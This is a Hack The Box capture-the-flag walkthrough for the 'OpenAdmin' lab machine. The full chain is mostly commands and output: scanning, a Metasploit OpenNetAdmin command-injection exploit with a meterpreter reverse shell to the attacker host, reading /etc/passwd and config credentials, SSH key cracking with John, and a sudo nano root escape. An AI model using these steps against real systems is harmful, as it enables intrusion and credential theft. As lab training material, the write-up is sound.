![](images/boxInfo.png)

nmap -sC -sV 10.10.10.171
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-10 07:31 India Standard Time
Nmap scan report for 10.10.10.171
Host is up (0.21s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.80 seconds
```

/root/go/bin/gobuster dir -u 10.10.10.171 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -t 50
```
/music (Status: 301)
/artwork (Status: 301)
/sierra (Status: 301)
/server-status (Status: 403)
```

clicking on the login button in /music sends us to /ona  
we can become admin by using the default credentials admin:admin  
the version is 18.1.1  
found a command injection exploit for OpenNetAdmin 18.1.1 for MetaSploit from searchsploit  
copied it to ~/.msf4/modules/exploits  
```
root@kali:~/.msf4/modules/exploits# searchsploit opennetadmin
---------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                  |  Path
                                                                | (/usr/share/exploitdb/)
---------------------------------------------------------------- ----------------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                   | exploits/php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)    | exploits/php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                     | exploits/php/webapps/47691.sh
---------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
root@kali:~/.msf4/modules/exploits# mkdir php
root@kali:~/.msf4/modules/exploits# mkdir php/webapps
root@kali:~/.msf4/modules/exploits# cp /usr/share/exploitdb/exploits/php/webapps/47772.rb php/webapps/
root@kali:~/.msf4/modules/exploits# ls php/webapps/
47772.rb
```

used the exploit in metasploit to get meterpreter shell 
```
msf5 > use exploit/php/webapps/47772                                                                                                                                                                               
msf5 exploit(php/webapps/47772) > show options                                                                                                                                                                     
                                                                                                                                                                                                                   
Module options (exploit/php/webapps/47772):                                                                                                                                                                        
                                                                                                                                                                                                                   
   Name       Current Setting  Required  Description                                                                                                                                                               
   ----       ---------------  --------  -----------                                                                                                                                                               
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]                                                                                                              
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'                                                                                        
   RPORT      80               yes       The target port (TCP)                                                                                                                                                     
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0                                                                                      
   SRVPORT    8080             yes       The local port to listen on.                                                                                                                                              
   SSL        false            no        Negotiate SSL/TLS for outgoing connections                                                                                                                                
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)                                                                                                          
   TARGETURI  /ona/login.php   yes       Base path                                                                                                                                                                 
   URIPATH                     no        The URI to use for this exploit (default is random)                                                                                                                       
   VHOST                       no        HTTP server virtual host                                                                                                                                                  
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
Payload options (linux/x86/meterpreter/reverse_tcp):                                                                                                                                                               
                                                                                                                                                                                                                   
   Name   Current Setting  Required  Description                                                                                                                                                                   
   ----   ---------------  --------  -----------                                                                                                                                                                   
   LHOST                   yes       The listen address (an interface may be specified)                                                                                                                            
   LPORT  4444             yes       The listen port                                                                                                                                                               
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
Exploit target:                                                                                                                                                                                                    
                                                                                                                                                                                                                   
   Id  Name                                                                                                                                                                                                        
   --  ----                                                                                                                                                                                                        
   0   Automatic Target                                                                                                                                                                                            
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
msf5 exploit(php/webapps/47772) > set rhost 10.10.10.171                                                                                                                                                           
rhost => 10.10.10.171                                                                                                                                                                                              
msf5 exploit(php/webapps/47772) > set lhost 10.10.14.57                                                                                                                                                            
lhost => 10.10.14.57                                                                                                                                                                                               
msf5 exploit(php/webapps/47772) > run                                                                                                                                                                              
                                                                                                                                                                                                                   
[*] Started reverse TCP handler on 10.10.14.57:4444                                                                                                                                                                
[*] Exploiting...                                                                                                                                                                                                  
[*] Command Stager progress - 100.14% done (704/703 bytes)
[*] Exploit completed, but no session was created.
msf5 exploit(php/webapps/47772) > show payloads                                                                                                                                                                    
                                                                                                                                                                                                                   
Compatible Payloads                                                                                                                                                                                                
===================                                                                                                                                                                                                
                                                                                                                                                                                                                   
   #   Name                                      Disclosure Date  Rank    Check  Description
   -   ----                                      ---------------  ----    -----  -----------
   0   generic/custom                                             normal  No     Custom Payload
   1   generic/debug_trap                                         normal  No     Generic x86 Debug Trap
   2   generic/shell_bind_tcp                                     normal  No     Generic Command Shell, Bind TCP Inline
   3   generic/shell_reverse_tcp                                  normal  No     Generic Command Shell, Reverse TCP Inline
   4   generic/tight_loop                                         normal  No     Generic x86 Tight Loop
   5   linux/x64/exec                                             normal  No     Linux Execute Command
   6   linux/x64/meterpreter/bind_tcp                             normal  No     Linux Mettle x64, Bind TCP Stager
   7   linux/x64/meterpreter/reverse_tcp                          normal  No     Linux Mettle x64, Reverse TCP Stager
   8   linux/x64/meterpreter_reverse_http                         normal  No     Linux Meterpreter, Reverse HTTP Inline
   9   linux/x64/meterpreter_reverse_https                        normal  No     Linux Meterpreter, Reverse HTTPS Inline
   10  linux/x64/meterpreter_reverse_tcp                          normal  No     Linux Meterpreter, Reverse TCP Inline
   11  linux/x64/pingback_bind_tcp                                normal  No     Linux x64 Pingback, Bind TCP Inline
   12  linux/x64/pingback_reverse_tcp                             normal  No     Linux x64 Pingback, Reverse TCP Inline
   13  linux/x64/shell/bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Stager
   14  linux/x64/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
   15  linux/x64/shell_bind_ipv6_tcp                              normal  No     Linux x64 Command Shell, Bind TCP Inline (IPv6)
   16  linux/x64/shell_bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Inline
   17  linux/x64/shell_bind_tcp_random_port                       normal  No     Linux Command Shell, Bind TCP Random Port Inline
   18  linux/x64/shell_reverse_ipv6_tcp                           normal  No     Linux x64 Command Shell, Reverse TCP Inline (IPv6)
   19  linux/x64/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
   20  linux/x86/chmod                                            normal  No     Linux Chmod
   21  linux/x86/exec                                             normal  No     Linux Execute Command
   22  linux/x86/meterpreter/bind_ipv6_tcp                        normal  No     Linux Mettle x86, Bind IPv6 TCP Stager (Linux x86)
   23  linux/x86/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Linux Mettle x86, Bind IPv6 TCP Stager with UUID Support (Linux x86)
   24  linux/x86/meterpreter/bind_nonx_tcp                        normal  No     Linux Mettle x86, Bind TCP Stager
   25  linux/x86/meterpreter/bind_tcp                             normal  No     Linux Mettle x86, Bind TCP Stager (Linux x86)
   26  linux/x86/meterpreter/bind_tcp_uuid                        normal  No     Linux Mettle x86, Bind TCP Stager with UUID Support (Linux x86)
   27  linux/x86/meterpreter/reverse_ipv6_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager (IPv6)
   28  linux/x86/meterpreter/reverse_nonx_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager
   29  linux/x86/meterpreter/reverse_tcp                          normal  No     Linux Mettle x86, Reverse TCP Stager
   30  linux/x86/meterpreter/reverse_tcp_uuid                     normal  No     Linux Mettle x86, Reverse TCP Stager
   31  linux/x86/meterpreter_reverse_http                         normal  No     Linux Meterpreter, Reverse HTTP Inline
   32  linux/x86/meterpreter_reverse_https                        normal  No     Linux Meterpreter, Reverse HTTPS Inline
   33  linux/x86/meterpreter_reverse_tcp                          normal  No     Linux Meterpreter, Reverse TCP Inline
   34  linux/x86/metsvc_bind_tcp                                  normal  No     Linux Meterpreter Service, Bind TCP
   35  linux/x86/metsvc_reverse_tcp                               normal  No     Linux Meterpreter Service, Reverse TCP Inline
   36  linux/x86/read_file                                        normal  No     Linux Read File
   37  linux/x86/shell/bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind IPv6 TCP Stager (Linux x86)
   38  linux/x86/shell/bind_ipv6_tcp_uuid                         normal  No     Linux Command Shell, Bind IPv6 TCP Stager with UUID Support (Linux x86)
   39  linux/x86/shell/bind_nonx_tcp                              normal  No     Linux Command Shell, Bind TCP Stager
   40  linux/x86/shell/bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Stager (Linux x86)
   41  linux/x86/shell/bind_tcp_uuid                              normal  No     Linux Command Shell, Bind TCP Stager with UUID Support (Linux x86)
   42  linux/x86/shell/reverse_ipv6_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager (IPv6)
   43  linux/x86/shell/reverse_nonx_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager
   44  linux/x86/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
   45  linux/x86/shell/reverse_tcp_uuid                           normal  No     Linux Command Shell, Reverse TCP Stager
   46  linux/x86/shell_bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind TCP Inline (IPv6)                                                                                       
   47  linux/x86/shell_bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Inline                                                                                              
   48  linux/x86/shell_bind_tcp_random_port                       normal  No     Linux Command Shell, Bind TCP Random Port Inline                                                                                  
   49  linux/x86/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
   50  linux/x86/shell_reverse_tcp_ipv6                           normal  No     Linux Command Shell, Reverse TCP Inline (IPv6)

msf5 exploit(php/webapps/47772) > set payload 7
payload => linux/x64/meterpreter/reverse_tcp
msf5 exploit(php/webapps/47772) > show options

Module options (exploit/php/webapps/47772):

   Name       Current Setting  Required  Description 
   ----       ---------------  --------  ----------- 
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.171     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated) 
   TARGETURI  /ona/login.php   yes       Base path
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp): 

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.57      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port 


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf5 exploit(php/webapps/47772) > run

[*] Started reverse TCP handler on 10.10.14.57:4444 
[*] Exploiting...
[*] Sending stage (3021284 bytes) to 10.10.10.171
[*] Meterpreter session 1 opened (10.10.14.57:4444 -> 10.10.10.171:60658) at 2020-03-10 01:32:32 -0400
[*] Command Stager progress - 100.12% done (809/808 bytes)

meterpreter > sysinfo
Computer     : 10.10.10.171
OS           : Ubuntu 18.04 (Linux 4.15.0-70-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux

meterpreter > cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash

meterpreter > ls
Listing: /opt/ona/www
=====================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100664/rw-rw-r--  1970   fil   2019-11-22 12:18:18 -0500  .htaccess.example
40775/rwxrwxr-x   4096   dir   2019-11-22 12:18:18 -0500  config
100664/rw-rw-r--  1949   fil   2019-11-22 12:18:18 -0500  config_dnld.php
100664/rw-rw-r--  4160   fil   2019-11-22 12:18:18 -0500  dcm.php
40775/rwxrwxr-x   4096   dir   2019-11-22 12:18:18 -0500  images
40775/rwxrwxr-x   4096   dir   2019-11-22 12:18:18 -0500  include
100664/rw-rw-r--  1999   fil   2019-11-22 12:18:18 -0500  index.php
40775/rwxrwxr-x   4096   dir   2019-11-22 12:18:18 -0500  local
100664/rw-rw-r--  4526   fil   2019-11-22 12:18:18 -0500  login.php
100664/rw-rw-r--  1106   fil   2019-11-22 12:18:18 -0500  logout.php
40775/rwxrwxr-x   4096   dir   2019-11-22 12:18:18 -0500  modules
100644/rw-r--r--  16106  fil   2020-03-15 23:18:12 -0400  p0wny_shell.php
40775/rwxrwxr-x   4096   dir   2019-11-22 12:18:18 -0500  plugins
40775/rwxrwxr-x   4096   dir   2019-11-22 12:18:18 -0500  winc
40775/rwxrwxr-x   4096   dir   2019-11-22 12:18:18 -0500  workspace_plugins
```

found the database credentials and was able to ssh as jimmy using the passwd
```
meterpreter > cat local/config/database_settings.inc.php 
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>
```

```
root@kali:~/Desktop/hackTheBox.eu# ssh jimmy@10.10.10.171
jimmy@10.10.10.171's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Mar 16 03:28:42 UTC 2020

  System load:  0.31              Processes:             150
  Usage of /:   49.9% of 7.81GB   Users logged in:       1
  Memory usage: 30%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Mar 16 03:24:08 2020 from 10.10.14.170
jimmy@openadmin:~$ ls
jimmy@openadmin:~$ ls -al
total 36
drwxr-x--- 5 jimmy jimmy 4096 Mar 16 03:41 .
drwxr-xr-x 4 root  root  4096 Nov 22 18:00 ..
lrwxrwxrwx 1 jimmy jimmy    9 Nov 21 14:07 .bash_history -> /dev/null
-rw-r--r-- 1 jimmy jimmy  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 jimmy jimmy 3771 Apr  4  2018 .bashrc
drwx------ 2 jimmy jimmy 4096 Nov 21 13:52 .cache
drwx------ 3 jimmy jimmy 4096 Nov 21 13:52 .gnupg
-rw------- 1 jimmy jimmy   47 Mar 16 03:41 .lesshst
drwxrwxr-x 3 jimmy jimmy 4096 Nov 22 23:15 .local
-rw-r--r-- 1 jimmy jimmy  807 Apr  4  2018 .profile
```
we cannot find user.txt in /home/jimmy so we have to become joanna to get user.txt  
found /var/www/internal/main.php which can be used to get ssh key for joanna
```
jimmy@openadmin:~$ ls /var/www
html  internal  ona

jimmy@openadmin:~$ cd /var/www/internal/

jimmy@openadmin:/var/www/internal$ ls
1.txt  index.php  logout.php  main.php

jimmy@openadmin:/var/www/internal$ cat main.php 
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

so we can get the ssh key for if we can curl main.php  
but "curl http://localhost/main.php" does not work  
so lets find if /var/www/internal is hosted on some port using netstat  
```
jimmy@openadmin:/var/www/internal$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp       64      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   

jimmy@openadmin:/var/www/internal$ curl http://localhost:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

the RSA key is encrypted so we can try and crack it using JohnTheRipper  
lets copy the RSA key to id_rsa and use JohnTheRipper  
```
root@kali:~/Desktop/hackTheBox.eu/activeMachines/OpenAdmin# ls
id_rsa  solution.md

root@kali:~/Desktop/hackTheBox.eu/activeMachines/OpenAdmin# /usr/share/john/ssh2john.py id_rsa > id_rsa.hash

root@kali:~/Desktop/hackTheBox.eu/activeMachines/OpenAdmin# ls
id_rsa  id_rsa.hash  solution.md

root@kali:~/Desktop/hackTheBox.eu/activeMachines/OpenAdmin# john --wordlist=/usr/share/wordlists/rockyou.txt --format=SSH id_rsa.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa)
Warning: Only 1 candidate left, minimum 8 needed for performance.
1g 0:00:00:04 DONE (2020-03-16 00:01) 0.2283g/s 3274Kp/s 3274Kc/s 3274KC/s *7¡Vamos!
Session completed
```

we got the password "bloodninjas" so we can ssh as joanna and get the user.txt
```
root@kali:~/Desktop/hackTheBox.eu/activeMachines/OpenAdmin# ssh -i id_rsa joanna@10.10.10.171
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Mar 16 04:07:16 UTC 2020

  System load:  0.27              Processes:             165
  Usage of /:   51.0% of 7.81GB   Users logged in:       1
  Memory usage: 33%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3
joanna@openadmin:~$ ls
user.txt
joanna@openadmin:~$ cat user.txt 
c9b2cf07d40807e62af62660f0c81b5f
```

"sudo -l" reveales that joanna can run "/bin/nano /opt/priv" command as root without any password  
so lets try to get root.txt using nano  
```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv

joanna@openadmin:~$ sudo /bin/nano /opt/priv
```
in nano we can read any file because it will run as root  
so use ^R to read /root/root.txt  
```
sudo /bin/nano /opt/priv
^R
/root/root.txt
```

we can also execute commands using ^R^X (ctrl+R then ctrl+X)  
so i can use ^R^X then use "cat /root/root.txt" to get root flag  
but to get a root shell we need to do something more  
searched for nano on gtfobins and found a command to get a shell  
URL: https://gtfobins.github.io/gtfobins/nano/  
```
sudo /bin/nano /opt/priv
^R^X
reset; /bin/bash 1>&0 2>&0
```

```
Command to execute: reset; /bin/bash 1>&0 2>&0root@openadmin:~# ls                                                                                                                                                 
user.txtelp                                                                                              ^X Read File
root@openadmin:~# whoami                                                                                 M-F New Buffer
root
root@openadmin:~# id
uid=0(root) gid=0(root) groups=0(root)
root@openadmin:~# cat /root/root.txt
2f907ed450b361b2c2bf4e8795d5b561
```

![](images/prize.png)

